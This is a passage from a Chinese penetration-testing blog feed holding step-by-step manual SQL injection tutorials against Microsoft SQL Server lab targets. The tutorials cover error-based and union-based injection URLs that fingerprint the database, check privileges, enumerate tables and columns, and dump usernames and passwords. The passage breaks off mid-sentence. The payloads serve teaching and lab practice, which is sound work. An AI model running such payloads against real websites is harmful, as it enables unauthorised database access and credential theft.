alt="图片"></p><p>这样我们就获取到了第三个列名 <code>password</code> ！</p><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><p>我们按照上面的顺序获取到了网站的表名：<code>users</code>，列名有：<code>id</code>、<code>username</code>、<code>password</code>。很明显账号密码就在列名的<code>username</code>、<code>password</code>，那么我们就可以获取数据了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert(int,(select top 1 列名 from 表名))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=convert(int,(select top 1 username from users))</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1418.png" alt="图片"></p><p>获取到了第一个<code>username</code>列名的第一个数据：<code>saul</code>！</p><p>如果想获取到 <code>username</code> 里面的第二个数据那么就加一个条件语句：<code>where username!=&#39;saul&#39;</code> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=convert(int,(select top 1 username from users where username!=&#x27;saul&#x27;))</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1419.png" alt="图片"></p><p>这样就获取到的 <code>username</code> 的第二个数据！想要获取第二个就以此类推！</p><p>既然 <code>username</code> 我们获取到了两个：<code>saul</code>、<code>admin</code>！那么我们就要获取到他们的密码了！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=convert(int,(select top 1 password from users))</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1420.png" alt="图片"></p><p>获取到第一个 <code>password</code> 列的值为：<code>saul520</code>！</p><p>想要获取下一个就加一个 <code>where</code> 条件语句：<code>where password!=&#39;saul520&#39;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=convert(int,(select top 1 password from users where password!=&#x27;saul520&#x27;))</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1421.png" alt="图片"></p><p>这样就获取到了第二个<code>password</code>的数据了！</p><p>至此<code>Mssql</code>的<code>报错注入</code>就到此为止！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MsSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Microsoft SQL Server手注之联合查询注入</title>
      <link href="/2020/03/12/SQL-MsSQL-1/"/>
      <url>/2020/03/12/SQL-MsSQL-1/</url>
      
        <content type="html"><![CDATA[<h2 id="Mssql数据库介绍"><a href="#Mssql数据库介绍" class="headerlink" title="Mssql数据库介绍"></a>Mssql数据库介绍</h2><p><code>SQL Server</code> 是 <code>Microsoft</code> 公司推出的关系型数据库管理系统。具有使用方便可伸缩性好与相关软件集成程度高等优点，可跨越从运行Microsoft Windows 98 的膝上型电脑到运行Microsoft Windows 2012 的大型多处理器的服务器等多种平台使用。</p><p><code>Microsoft SQL Server</code> 是一个全面的数据库平台，使用集成的商业智能 (BI)工具提供了企业级的数据管理。<code>Microsoft SQL Server</code> 数据库引擎为关系型数据和结构化数据提供了更安全可靠的存储功能，使您可以构建和管理用于业务的高可用和高性能的数据应用程序。</p><h3 id="Mssql数据库测试环境搭建"><a href="#Mssql数据库测试环境搭建" class="headerlink" title="Mssql数据库测试环境搭建"></a>Mssql数据库测试环境搭建</h3><p>完整安装<code>SQL Server 2008</code> 数据库:<a href="https://jingyan.baidu.com/article/948f592434b407d80ef5f97d.html">https://jingyan.baidu.com/article/948f592434b407d80ef5f97d.html</a></p><h3 id="Mssql数据库权限介绍"><a href="#Mssql数据库权限介绍" class="headerlink" title="Mssql数据库权限介绍"></a>Mssql数据库权限介绍</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sa权限：数据库操作，文件管理，命令执行，注册表读取等：相当于system</span><br><span class="line">db权限：文件管理、数据库操作等等：相当于users-administrators</span><br><span class="line">public权限：数据库操作：相当于guest-users</span><br></pre></td></tr></table></figure><h3 id="Mssql数据库调用的代码"><a href="#Mssql数据库调用的代码" class="headerlink" title="Mssql数据库调用的代码"></a>Mssql数据库调用的代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;% </span><br><span class="line">set conn =server.createobject(&quot;adodb.connection&quot;) conn.open  &quot;provider=sqloledb;source=local;uid=sa;pwd=******;database=database-name&quot;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">注释：uid：账号， pwd：密码</span><br></pre></td></tr></table></figure><h3 id="Mssql数据库手工注入"><a href="#Mssql数据库手工注入" class="headerlink" title="Mssql数据库手工注入"></a>Mssql数据库手工注入</h3><h3 id="判断是否是Mssql数据库"><a href="#判断是否是Mssql数据库" class="headerlink" title="判断是否是Mssql数据库"></a>判断是否是Mssql数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists(select * from sysobjects) -</span><br></pre></td></tr></table></figure><p>输入<code>SQL</code>语句，如果<code>返回正常</code>那么就说明网站所使用的数据库是<code>Mssql</code>数据库，因为<code>Mssql</code>数据库默认有一个<code>sysobjects</code>的表.</p><h3 id="判断权限的SQL语句"><a href="#判断权限的SQL语句" class="headerlink" title="判断权限的SQL语句"></a>判断权限的SQL语句</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select is_srvrolemember(&#x27;sysadmin&#x27;)) //判断是否是系统管理员 </span><br><span class="line">and 1=(select is_srvrolemember(&#x27;db_owner&#x27;)) //判断是否是库权限 </span><br><span class="line">and 1=(select is_srvrolemember(&#x27;public&#x27;))   //判断是否为public权限</span><br></pre></td></tr></table></figure><h2 id="SQL手工注入漏洞测试-Sql-Server数据库"><a href="#SQL手工注入漏洞测试-Sql-Server数据库" class="headerlink" title="SQL手工注入漏洞测试(Sql Server数据库)"></a>SQL手工注入漏洞测试(Sql Server数据库)</h2><p>靶场地址：<a href="https://www.mozhe.cn/bug/detail/SXlYMWZhSm15QzM1OGpyV21BR1p2QT09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/SXlYMWZhSm15QzM1OGpyV21BR1p2QT09bW96aGUmozhe</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1392.png" alt="图片"></p><p>注入点：<a href="http://219.153.49.228:42837/new_list.asp?id=2">http://219.153.49.228:42837/new_list.asp?id=2</a></p><h3 id="判断是否是Mssql"><a href="#判断是否是Mssql" class="headerlink" title="判断是否是Mssql"></a>判断是否是Mssql</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:42837/new_list.asp?id=2 and exists(select * from sysobjects)</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1393.png" alt="图片"></p><p>返回正常，说明网站使用的数据库是<code>Mssql</code>！</p><h3 id="判断字段长度"><a href="#判断字段长度" class="headerlink" title="判断字段长度"></a>判断字段长度</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:42837/new_list.asp?id=2 order by 5</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1394.png" alt="图片"></p><p><code>order by 5</code>返回错误我们往前推一位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:42837/new_list.asp?id=2 order by 4 </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1395.png" alt="图片"></p><p><code>order by 4</code>返回正常，说明字段长度是4！</p><h3 id="寻找字符型显示位"><a href="#寻找字符型显示位" class="headerlink" title="寻找字符型显示位"></a>寻找字符型显示位</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:42837/new_list.asp?id=-2 union all select null,null,null,null</span><br><span class="line">这里使用的是 union all，它和 union select 的区别就是：union select 会自动去除一些重复的字段！</span><br><span class="line">在这个靶场使用 union select 是不行的，所以我们就用 union all</span><br><span class="line">然后我使用的 null 是说明它无关是字符型还是数字型</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1396.png" alt="图片"></p><p>接下来我们一个个去猜测它的显示位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:42837/new_list.asp?id=-2 union all select &#x27;1&#x27;,null,null,null</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1397.png" alt="图片"></p><p><code>&#39;1&#39;</code>他没有任何反应， 说明它不在第1列，那么我们继续查下一个 <code>null</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:42837/new_list.asp?id=-2 union all select null,&#x27;2&#x27;,null,null</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1398.png" alt="图片"></p><p>这个时候他页面上就有一个数字<code>&quot;2&quot;</code>，说明<code>2</code>这个位置我们可以去利用它！</p><p>我们继续看看第三位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:42837/new_list.asp?id=-2 union all select null,&#x27;2&#x27;,&#x27;3&#x27;,null</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1399.png" alt="图片"></p><p>可以看到，我们的页面上又多出了一个<code>‘3’</code>，说明第三个显示位也可以去利用！</p><p>我们再来看看第四个（其实有两个显示位就足够了）：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1400.png" alt="图片"></p><p>猜测第四个的时候页面没有什么反应，说明它只存在<code>‘2’</code>、<code>‘3’</code>两个显示位！</p><h3 id="查询相关的信息"><a href="#查询相关的信息" class="headerlink" title="查询相关的信息"></a>查询相关的信息</h3><p>既然我们有了显示位，那么我们就可以利用显示位去查询我们想要得到的信息！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@@version-：获取版本信息</span><br><span class="line">db_name()：数据库名字 </span><br><span class="line">user,system_user,current_user,user_name： 获取当前⽤户名 </span><br><span class="line">@@SERVERNAME： 获取有关服务器主机的信息</span><br></pre></td></tr></table></figure><h3 id="获取版本信息"><a href="#获取版本信息" class="headerlink" title="获取版本信息"></a>获取版本信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:42837/new_list.asp?id=-2 union all select null,@@version,&#x27;3&#x27;,null</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1401.png" alt="图片"></p><h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:42837/new_list.asp?id=-2 union all select null,db_name(),&#x27;3&#x27;,null</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1402.png" alt="图片"></p><h3 id="获取当前数据库名"><a href="#获取当前数据库名" class="headerlink" title="获取当前数据库名"></a>获取当前数据库名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:42837/new_list.asp?id=-2 union all select null,user,&#x27;3&#x27;,null</span><br><span class="line">http://219.153.49.228:42837/new_list.asp?id=-2 union all select null,system_user,&#x27;3&#x27;,null</span><br><span class="line">http://219.153.49.228:42837/new_list.asp?id=-2 union all select null,current_user,&#x27;3&#x27;,null</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1403.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1404.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1405.png" alt="图片"></p><h3 id="查询表明"><a href="#查询表明" class="headerlink" title="查询表明"></a>查询表明</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:42837/new_list.asp?id=-2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype=&#x27;u&#x27;),&#x27;3&#x27;,4</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1406.png" alt="图片"></p><p>这边查询出来第一个表示 <code>manage</code>，然后我们再去查第二个（到了这里我的靶机重启了一下，所以端口变了）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43946/new_list.asp?id=-2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;manage&#x27;)),&#x27;3&#x27;,4</span><br><span class="line"></span><br><span class="line">注释：name not in (&#x27;manage&#x27;) 这段语句意思是查询 name 不是 &#x27;manage&#x27; 的，这样就可以排除 &#x27;manage&#x27; 从而查询下一个表名</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1407.png" alt="图片"></p><p>查询出来第二个表名是 <code>announcement</code>，如果想继续查的话继续用 <code>not in</code> 这条判断查询就行了！</p><h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43946/new_list.asp?id=-2 union all select null,(select top 1 col_name(object_id(&#x27;manage&#x27;),1) from sysobjects),null,null</span><br><span class="line"></span><br><span class="line">注释：col_name 是查询的列名，object_id(&#x27;manage&#x27;)是从manage这个表里查询，1 代表的是查询第一个列名</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1408.png" alt="图片"></p><p>这边查询出来第一个列名是 <code>id</code>，我们继续查第二个列名只需要把数字1修改为2就行了 <code>col_name(object_id(&#39;manage&#39;),2</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43946/new_list.asp?id=-2 union all select null,(select top 1 col_name(object_id(&#x27;manage&#x27;),2) from sysobjects),null,null</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1409.png" alt="图片"></p><p>查询出来第二个列名是 <code>username</code>，我们继续查询第三个列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43946/new_list.asp?id=-2 union all select null,(select top 1 col_name(object_id(&#x27;manage&#x27;),3) from sysobjects),null,null</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1410.png" alt="图片"></p><p>第三个列名是 <code>password</code>，这个时候我们就得到了 <code>username</code> 和 <code>password</code> 列！</p><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43946/new_list.asp?id=-2 union all select null,username, password ,null from manage</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1411.png" alt="图片"></p><p>这个时候我们就注入出来了他的账号：<code>admin_mz</code>，密码 <code>72e1bfc3f01b7583</code>！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MsSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>史上最详细的sqlServer手工注入详解</title>
      <link href="/2020/03/09/SQL-MsSQL/"/>
      <url>/2020/03/09/SQL-MsSQL/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=29418950&auto=1&height=66"></iframe><h2 id="MSSQL数据库"><a href="#MSSQL数据库" class="headerlink" title="MSSQL数据库"></a>MSSQL数据库</h2><h3 id="数据库简介"><a href="#数据库简介" class="headerlink" title="数据库简介"></a>数据库简介</h3><p><code>MSSQL</code>是指微软的<code>SQL Server</code>数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。属关系型数据库</p><h3 id="注入简介"><a href="#注入简介" class="headerlink" title="注入简介"></a>注入简介</h3><p><code>MSSQL</code>注入攻击是最为复杂的数据库攻击技术，由于该数据库功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖的攻击思路</p><p>对于<code>mssql</code>的一个注入点我们往往最关心的这个注入点的权限问题,是<code>sa</code>、<code>db_owner</code>还是<code>public</code>;其次是这个注点是否显错,注释语句是否可用,例如<code>sql server</code>中注释符“<code>--</code>”;还有就是注入点是什么类型的,是字符型注入,还是数字型注入。</p><p>对与<code>mssql</code>有三个权限，<code>sa</code>（最高权限，相当于system），<code>db</code>（文件管理，数据库操作等等，相当于user-administrator），<code>public</code>（数据库操作权限，相当于guest-users）</p><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>基础知识：<code>MSSQL</code>的系统自带库–&gt;<code>master</code></p><p>其实再每个网站中，一般一个网站不会跨库，而在<code>MSSQL</code>中每个库都有一个系统自带表–&gt;<code>sysobjects</code></p><p>此系统表中对我们有用的只有3个字段，<code>NAME</code>字段和<code>XTYPE</code>字段和<code>ID</code>字段，<code>name就是表名信息</code>，<code>xtype是代表表的类型</code>，只有两个参数，<code>S</code>代表系统自带表，<code>U</code>代表用户创建的表，<code>id</code>字段的值用来<code>连接syscolumns</code>表</p><p><code>syscolumns</code>表中我们需要查询的字段就是<code>name</code>字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1350.png" alt="图片"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> syscolumns <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2073058421</span>;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1351.png" alt="图片"></p><p><code>top</code>关键字：由于<code>MSSQL</code>中不存在<code>limit</code>，那么想要输出一条数据怎么办呢，直接<code>top 1</code>，输出两条数据<code>top 2</code>，输出第二条数据<code>top 1+</code>限制条件!</p><p>如何实现<code>MySQL</code>中的<code>group_concat()</code>函数的用法，实例如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> top <span class="number">1</span> id, [name] <span class="operator">=</span> stuff((<span class="keyword">SELECT</span> <span class="string">&#x27;,&#x27;</span> <span class="operator">+</span> [name] <span class="keyword">FROM</span> syscolumns sys <span class="keyword">WHERE</span> sys.id <span class="operator">=</span> syscolumns.id <span class="keyword">FOR</span> xml path(<span class="string">&#x27;&#x27;</span>)) , <span class="number">1</span> , <span class="number">1</span> , <span class="string">&#x27;&#x27;</span>) <span class="keyword">FROM</span> syscolumns <span class="keyword">where</span> id <span class="operator">=</span><span class="number">2073058421</span>;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1352.png" alt="图片"></p><h3 id="Mssql插入新的数据"><a href="#Mssql插入新的数据" class="headerlink" title="Mssql插入新的数据"></a>Mssql插入新的数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users (id,username,password,age) <span class="keyword">values</span>(<span class="number">4</span>,<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;test&#x27;</span>,<span class="number">20</span>)</span><br><span class="line">注释：</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users (id,username,password,age)：往users表里 id,username,password,age 插入数据</span><br><span class="line">     <span class="keyword">values</span>(<span class="number">4</span>,<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;test&#x27;</span>,<span class="number">20</span>)：插入数据的值为：<span class="number">4</span>,<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;test,&#x27;</span><span class="number">20</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1353.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1354.png" alt="图片"></p><h3 id="Mssql修改数据"><a href="#Mssql修改数据" class="headerlink" title="Mssql修改数据"></a>Mssql修改数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">update users <span class="keyword">set</span> username<span class="operator">=</span><span class="string">&#x27;saul123&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">4</span>;</span><br><span class="line">注释：</span><br><span class="line">update users   更新更改 users 表</span><br><span class="line">    <span class="keyword">set</span> username<span class="operator">=</span><span class="string">&#x27;saul123&#x27;</span>吧 username 的值修改为 saul123</span><br><span class="line">    <span class="keyword">where</span> id<span class="operator">=</span><span class="number">4</span>条件是 id<span class="operator">=</span><span class="number">4</span> 这条数据</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1355.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1356.png" alt="图片"></p><h3 id="Mssql删除数据"><a href="#Mssql删除数据" class="headerlink" title="Mssql删除数据"></a>Mssql删除数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">4</span>;</span><br><span class="line">注释：</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> users 删除 users 表里的</span><br><span class="line">    <span class="keyword">where</span> id<span class="operator">=</span><span class="number">4</span>条件是 id<span class="operator">=</span><span class="number">4</span> 这条数据</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1357.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1358.png" alt="图片"></p><h3 id="MSSQL中常用参数"><a href="#MSSQL中常用参数" class="headerlink" title="MSSQL中常用参数"></a>MSSQL中常用参数</h3><p><code>@@version</code>，查询当前数据库版本<br><code>db_name()</code>，查询当前数据库名称<br><code>user</code>，查询当前用户<br><code>IS_SRVROLEMEMBER()</code>，查询数据库权限。<br>常用权限：sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin<br>用法如下，证明相应权限则返回<code>1</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1359.png" alt="图片"></p><h2 id="Mssql手工注入详解"><a href="#Mssql手工注入详解" class="headerlink" title="Mssql手工注入详解"></a>Mssql手工注入详解</h2><p>注入点：<a href="http://192.168.159.135:8080/get.aspx?id=1">http://192.168.159.135:8080/get.aspx?id=1</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1360.png" alt="图片"></p><h3 id="判断是否是Mssql数据库"><a href="#判断是否是Mssql数据库" class="headerlink" title="判断是否是Mssql数据库"></a>判断是否是Mssql数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and (select count(*) from sysobjects)&gt;0</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1361.png" alt="图片"></p><p>页面返回正常说明是 <code>mssql</code> 数据库！而且你使用了上面这条语句说明它权限还有点大，还有可能是 <code>sa</code> 权限，因为可以读取任意表。</p><h3 id="判断权限"><a href="#判断权限" class="headerlink" title="判断权限"></a>判断权限</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>));<span class="comment">--</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">&#x27;serveradmin&#x27;</span>));<span class="comment">--</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">&#x27;setupadmin&#x27;</span>));<span class="comment">--</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">&#x27;securityadmin&#x27;</span>));<span class="comment">--</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">&#x27;diskadmin&#x27;</span>));<span class="comment">--</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">&#x27;bulkadmin&#x27;</span>));<span class="comment">--</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> IS_MEMBER(<span class="string">&#x27;db_owner&#x27;</span>));<span class="operator">-</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1362.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;));--</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1363.png" alt="图片"></p><p>页面返回正常，说明他是 